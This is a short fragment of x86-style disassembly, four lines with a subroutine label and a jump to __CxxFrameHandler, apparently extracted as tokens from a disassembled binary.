retn
sub_40229b
mov eax r--data
jmp __CxxFrameHandler
